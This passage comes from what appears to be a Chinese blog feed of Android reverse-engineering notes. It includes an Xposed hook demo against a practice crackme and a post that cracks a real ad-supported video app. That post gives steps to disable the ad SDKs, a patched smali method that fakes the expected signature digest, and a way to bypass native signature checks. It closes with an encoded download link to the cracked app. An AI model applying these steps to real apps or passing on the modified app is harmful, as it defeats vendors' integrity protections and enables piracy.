punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ClassLoader</span> classLoader <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">//hook 逻辑在这里面写  </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>hook 加固应用第一步拿到 classloader</p>\n<p><strong>总的 Hook.java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sky<span class=\"token punctuation\">.</span>xposeddemo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">android<span class=\"token punctuation\">.</span>app<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Application</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">android<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Context</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">android<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Log</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IXposedHookLoadPackage</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XC_MethodHook</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XC_MethodReplacement</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XposedBridge</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XposedHelpers</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">de<span class=\"token punctuation\">.</span>robv<span class=\"token punctuation\">.</span>android<span class=\"token punctuation\">.</span>xposed<span class=\"token punctuation\">.</span>callbacks<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XC_LoadPackage</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Hook</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IXposedHookLoadPackage</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">handleLoadPackage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">XC_LoadPackage<span class=\"token punctuation\">.</span>LoadPackageParam</span> loadPackageParam<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>loadPackageParam<span class=\"token punctuation\">.</span>packageName<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">/*XposedHelpers.findAndHookMethod (\"com.zj.wuaipojie.Demo\", loadPackageParam.classLoader, \"a\", String.class, new XC_MethodHook () &#123;// 要根据实际传入参数的类型</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            protected void beforeHookedMethod (MethodHookParam param) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                super.beforeHookedMethod (param);</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                Log.d (\"zj2595\",param.args [0].toString ());</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                XposedBridge.log (param.args [0].toString ());</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                String a = \"pt 嘿嘿嘿参数修改成功\";</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                param.args [0] = a;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                Log.d (\"zj2595\",param.args [0].toString ());</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            protected void afterHookedMethod (MethodHookParam param) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                super.afterHookedMethod (param);</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                Log.d (\"zj2595\",param.getResult ().toString ());</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                param.setResult (\"返回值修改成功哇哈哈\");</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        &#125;);*/</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>       <span class=\"token comment\">/* Class a = loadPackageParam.classLoader.loadClass(\"com.zj.wuaipojie.Demo\");</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        XposedBridge.hookAllMethods(a, \"complexParameterFunc\", new XC_MethodHook() &#123;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                super.beforeHookedMethod(param);</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                Log.d(\"zj2595\",param.args[0].toString());</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        &#125;);*/</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token comment\">/*Class a = loadPackageParam.classLoader.loadClass (\"com.zj.wuaipojie.Demo\");</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        XposedBridge.hookAllMethods (a,\"repleaceFunc\",new XC_MethodReplacement () &#123;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            protected Object replaceHookedMethod (MethodHookParam methodHookParam) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                return \"\";// 可用于去弹窗</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        &#125;);*/</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Application</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"attach\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Context</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 回调函数</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token class-name\">Context</span> context <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">)</span> param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token class-name\">ClassLoader</span> classLoader <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie.Demo\"</span><span class=\"token punctuation\">,</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 要根据实际传入参数的类型</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zj2595\"</span><span class=\"token punctuation\">,</span>param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                <span class=\"token class-name\">XposedBridge</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token class-name\">String</span> a <span class=\"token operator\">=</span> <span class=\"token string\">\"pt嘿嘿嘿参数修改成功\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zj2595\"</span><span class=\"token punctuation\">,</span>param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zj2595\"</span><span class=\"token punctuation\">,</span>param<span class=\"token punctuation\">.</span><span class=\"token function\">getResult</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                param<span class=\"token punctuation\">.</span><span class=\"token function\">setResult</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"返回值修改成功哇哈哈\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                <span class=\"token comment\">//hook 逻辑在这里面写</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/08/%E6%9B%B4%E6%96%B0%E5%90%8E%E6%9F%90%E7%94%B5%E8%A7%86%E9%A2%91APP%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%A0%B4%E8%A7%A3/",
            "url": "https://3cly.github.io/2023/09/08/%E6%9B%B4%E6%96%B0%E5%90%8E%E6%9F%90%E7%94%B5%E8%A7%86%E9%A2%91APP%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%A0%B4%E8%A7%A3/",
            "title": "更新后某电视频APP去广告破解",
            "date_published": "2023-09-08T07:21:05.000Z",
            "content_html": "<h1 id=\"更新后某电视频app去广告破解\"><a class=\"markdownIt-Anchor\" href=\"#更新后某电视频app去广告破解\">#</a> 更新后某电视频 APP 去广告破解</h1>\n<p>参考 52pj 大佬教程:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTgxNDkxNy0xLTEuaHRtbA==\">https://www.52pojie.cn/thread-1814917-1-1.html</span></p>\n<p>教程中样本软件版本是 1.5.1, 本博客基于更新后的版本 1.6.1 部分操作不一样 大致思路一样的</p>\n<p>比较逆天的就是真机启动闪退 只好用模拟器了</p>\n<h2 id=\"破解思路\"><a class=\"markdownIt-Anchor\" href=\"#破解思路\">#</a> 破解思路</h2>\n<p>想在 APP 免费看片，有两种路径 一种是看广告，一种是邀请人数也就是推广，这里用的是通过去广告的方法实现免费看片</p>\n<h2 id=\"广告分析\"><a class=\"markdownIt-Anchor\" href=\"#广告分析\">#</a> 广告分析</h2>\n<p>许多广告的 SDK 文档百度能搜 就不列举了</p>\n<p><img data-src=\"/images/image-20230907135215523.png\" alt=\"image-20230907135215523\"></p>\n<p>jadx 一开就能看见一堆广告相关</p>\n<h3 id=\"去广告\"><a class=\"markdownIt-Anchor\" href=\"#去广告\">#</a> 去广告</h3>\n<p>广告 SDK 少的话 就直接在文档里找关键的方法 改返回值即可</p>\n<p>这个软件就是广告比较多的</p>\n<p>关键字:initsdk、loadad、initad 等</p>\n<p>SDK 的初始化基本上都在启动类</p>\n<p><img data-src=\"/images/image-20230907141405616.png\" alt=\"image-20230907141405616\"></p>\n<p>activity 活动记录先</p>\n<p><img data-src=\"/images/image-20230907141549356.png\" alt=\"image-20230907141549356\"></p>\n<p><img data-src=\"/images/image-20230907143037411.png\" alt=\"image-20230907143037411\"></p>\n<p><img data-src=\"/images/image-20230907143226970.png\" alt=\"image-20230907143226970\"></p>\n<p>查找用例可以发现这里  这些一系列方法都是 SDK 的初始化  因为是 void 方法于是把这个 d 方法中间的代码都删了即可 (或加一个 return-void)</p>\n<p><img data-src=\"/images/image-20230907145107792.png\" alt=\"image-20230907145107792\"></p>\n<p>VIP 免广告</p>\n<p><img data-src=\"/images/image-20230907172042361.png\" alt=\"image-20230907172042361\"></p>\n<p>关键方法:getFree_time ()</p>\n<h3 id=\"去除签名校验\"><a class=\"markdownIt-Anchor\" href=\"#去除签名校验\">#</a> 去除签名校验</h3>\n<p>(没管签名校验就用算法助手直接 hook)</p>\n<h4 id=\"法一简单注释掉exit的地方hook\"><a class=\"markdownIt-Anchor\" href=\"#法一简单注释掉exit的地方hook\">#</a> 法一 (简单): 注释掉 exit 的地方 (hook)</h4>\n<p>直接搜 app kill 即可找到三个退出的地方</p>\n<h4 id=\"法二手撕找到验证md5摘要的地方在smail代码进行一个方法重写让他得到的字符串与校验所需的md5值一样\"><a class=\"markdownIt-Anchor\" href=\"#法二手撕找到验证md5摘要的地方在smail代码进行一个方法重写让他得到的字符串与校验所需的md5值一样\">#</a> 法二 (手撕！): 找到验证 MD5 摘要的地方，在 smail 代码进行一个方法重写让他得到的字符串与校验所需的 MD5 值一样</h4>\n<p><img data-src=\"/images/image-20230907192124173.png\" alt=\"image-20230907192124173\"></p>\n<p>if 判断找到 obj 参数和 saiFunUtils.f8000c 参数，后者是 app_id 查找后就是 zidian</p>\n<p>equals 的值是<img data-src=\"/images/image-20230907192701068.png\" alt=\"image-20230907192701068\"></p>\n<p><img data-src=\"/images/image-20230907192956888.png\" alt=\"image-20230907192956888\"></p>\n<p><strong>13AB01332853FA65AD5C3BA49950A45C</strong>  32 位字符串 猜测为 MD5 摘要</p>\n<p><img data-src=\"/images/image-20230907193215342.png\" alt=\"image-20230907193215342\"></p>\n<p>找到这个第一个参数的方法，看到 getPackageName () 方法 (多半就涉及到签名信息了)</p>\n<p><img data-src=\"/images/image-20230907194544672.png\" alt=\"image-20230907194544672\"></p>\n<p>继续 ctrl + 鼠标左键寻找到这里有 signature 的 f 方法</p>\n<p>结合上述以及算法助手 hook 打印 f 方法日志 可以得知这个 w 方法就是获取包的 MD5 摘要再和你的对比</p>\n<p>于是 MT 管理器修改 f 方法的 smail 代码</p>\n<pre><code>.method public static f()Ljava/util/List;\n    .registers 2\n    .annotation build Landroidx/annotation/NonNull;\n    .end annotation\n\n    .annotation system Ldalvik/annotation/Signature;\n        value = &#123;\n            &quot;()&quot;,\n            &quot;Ljava/util/List&lt;&quot;,\n            &quot;Ljava/lang/String;&quot;,\n            &quot;&gt;;&quot;\n        &#125;\n    .end annotation\n\n    .line 1\n    new-instance v0, Ljava/util/ArrayList;\n\n    invoke-direct &#123;v0&#125;, Ljava/util/ArrayList;-&gt;&lt;init&gt;()V\n\n    const-string v1, &quot;F9:6C:E9:5F:D5:47:BE:DF:81:15:E3:71:8A:10:54:45&quot; \n    #创建了一个新的 ArrayList 实例，然后向列表中添加了一个字符串常量 &quot;F9:6C:E9:5F:D5:47:BE:DF:81:15:E3:71:8A:10:54:45&quot;\n\n    invoke-virtual &#123;v0, v1&#125;, Ljava/util/ArrayList;-&gt;add(Ljava/lang/Object;)Z\n\n    return-object v0\n.end method\n\n</code></pre>\n<h5 id=\"大坑\"><a class=\"markdownIt-Anchor\" href=\"#大坑\">#</a> 大坑</h5>\n<p>经过大佬的分析，该 APP 的签名校验分为 java 层和 native 层 (反射获取签名信息), 改 MD5 只通过了 java 层，仍然会播放失败！(反射介绍:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82Mjc3YzFmOWY0OGQ=\">https://www.jianshu.com/p/6277c1f9f48d</span>)</p>\n<p><img data-src=\"/images/image-20230907190446500.png\" alt=\"image-20230907190446500\"></p>\n<p>所有导出函数已被混淆 (知识补充:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2psdHhnY3kvYXJ0aWNsZS9kZXRhaWxzLzEwOTAxMjAwNg==\">https://blog.csdn.net/jltxgcy/article/details/109012006</span>)</p>\n<p><img data-src=\"/images/image-20230907190901893.png\" alt=\"image-20230907190901893\"></p>\n<p>JNI 也被改过 故 so 文件分析困难</p>\n<p>大佬的话是说通过其他的一些工具分析出这个 so 其实是通过反射来获取签名的信息 (b 站问了大佬大佬说其他工具是指 funelf,github 上一搜就有)</p>\n<p><img data-src=\"/images/image-20230907191521875.png\" alt=\"image-20230907191521875\"></p>\n<p>分析日志可知可以通过 PM 代理的方法代理它的签名信息</p>\n<p>手动用 PM 代理是不会的，可以用 MT 管理器自带的去除签名校验功能 (原理其实就是 PM 代理)</p>\n<h5 id=\"闪退问题\"><a class=\"markdownIt-Anchor\" href=\"#闪退问题\">#</a> 闪退问题</h5>\n<p>一开始就要去签名校验，然后才能改包！</p>\n<h3 id=\"成功广告一去可以看奥本海默了\"><a class=\"markdownIt-Anchor\" href=\"#成功广告一去可以看奥本海默了\">#</a> 成功！广告一去，可以看奥本海默了！</h3>\n<p><img data-src=\"/images/image-20230907204120189.png\" alt=\"image-20230907204120189\"></p>\n<p>布局优化什么的还没搞，直接点观看广告 是不会弹广告的 就是在广告 SDK 初始化的时候让他直接 return-void 了，关键还是签名校验部分吧</p>\n<p>这里挂一个百度网盘链接，需要就直接下载吧</p>\n<p>6ZO+5o6l77yaaHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWNjNW10Z3Q4eWdaVkduVmlsZXB4YWc/cHdkPXl2eGUgCuaPkOWPluegge+8mnl2eGUgCi0t5p2l6Ieq55m+5bqm572R55uY6LaF57qn5Lya5ZGYVjXnmoTliIbkuqs=</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/30/andriodlabs-%E6%9B%B4%E6%96%B0%E4%B8%AD/",
            "url": "https://3cly.github.io/2023/07/30/andriodlabs-%E6%9B%B4%E6%96%B0%E4%B8%AD/",
            "title": "andriodlabs_更新中",
            "date_published": "2023-07-30T15:34:38.000Z",
            "content_html": "<h1 id=\"andriodlabs\"><a class=\"markdownIt-Anchor\" href=\"#andriodlabs\">#</a> andriodlabs</h1>\n<p>之前手贱又更新到安卓 13 了 又需要重新刷一次机 心累</p>\n<p><img data-src=\"/images/image-20230712124358034.png\" alt=\"image-20230712124358034\"></p>\n<p>记住 frida-server 在 /data/local/tmp/</p>\n<p>有关 jar 包:<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84MjMyMDQ5Mg==\">https://zhuanlan.zhihu.com/p/82320492</span></p>\n<h2 id=\"安卓架构\"><a class=\"markdownIt-Anchor\" href=\"#安卓架构\">#</a> 安卓架构</h2>\n<p>Android 是一个开源的，基于 Linux 的移动设备操作系统</p>\n<p>应用程序组件是一个 Android 应用程序的基本构建块。这些组件由应用清单文件松耦合的组织。AndroidManifest.xml 描述了应用程序的每个组件，以及他们如何交互。</p>\n<p>以下是可以在 Android 应用程序中使用的四个主要组件。</p>\n<table>\n<thead>\n<tr>\n<th>组件</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Activities (活动)</td>\n<td>描述 UI，并且处理用户与机器屏幕的交互。</td>\n</tr>\n<tr>\n<td>Services (服务)</td>\n<td>处理与应用程序关联的后台操作。</td>\n</tr>\n<tr>\n<td>Broadcast Receivers (广播接收器)</td>\n<td>处理 Android 操作系统和应用程序之间的通信。</td>\n</tr>\n<tr>\n<td>Content Providers (内容提供者)</td>\n<td>处理数据和数据库管理方面的问题。</td>\n</tr>\n</tbody>\n</table>\n<p>Android 的分 4 层，java 应用程序，java 框架，本地框架和 java 运行环境，Linux 内核空间</p>\n<p>Java 应用程序无需过多解释，基本可以理解为各个 App，由 Java 语言实现。</p>\n<p>Java 框架层（系统服务）就是常说的 Framework，这层里东西很多也很复杂，比如说主要的一些系统服务如 ActivityManagerService、PackageManagerService 等，我们编写的 Android 代码之所以能够正常识别和动作，都要依赖这一层的支持。这一层也是由 Java 语言实现。</p>\n<p>Native 层（本地服务）这部分常见一些本地服务和一些链接库等。这一层的一个特点就是通过 C 和 C<ins> 语言实现。比如我们现在要执行一个复杂运算，如果通过 java 代码去实现，那么效率会非常低，此时可以选择通过 C 或 C</ins> 代码去实现，然后和我们上层的 Java 代码通信（这部分在 android 中称为 jni 机制）。又比如我们的设备需要运行，那么必然要和底层的硬件驱动交互，也要通过 Native 层。</p>\n<p>Linux 内核空间就不过多解释了</p>\n<h2 id=\"lab1\"><a class=\"markdownIt-Anchor\" href=\"#lab1\">#</a> lab1</h2>\n<p><img data-src=\"/images/image-20230711222422735.png\" alt=\"image-20230711222422735\"></p>\n<p><img data-src=\"/images/image-20230712144054758.png\" alt=\"image-20230712144054758\"></p>\n<p><img data-src=\"/images/image-20230712144128626.png\" alt=\"image-20230712144128626\"></p>\n<p><img data-src=\"/images/_979679506_Screenshot_20230712-144229_1689144149000_wifi_0.jpg\" alt=\"img\"></p>\n<h2 id=\"arm汇编学习\"><a class=\"markdownIt-Anchor\" href=\"#arm汇编学习\">#</a> ARM 汇编学习</h2>\n<p>用 NDK 编译 C 语言文件出来 ARM 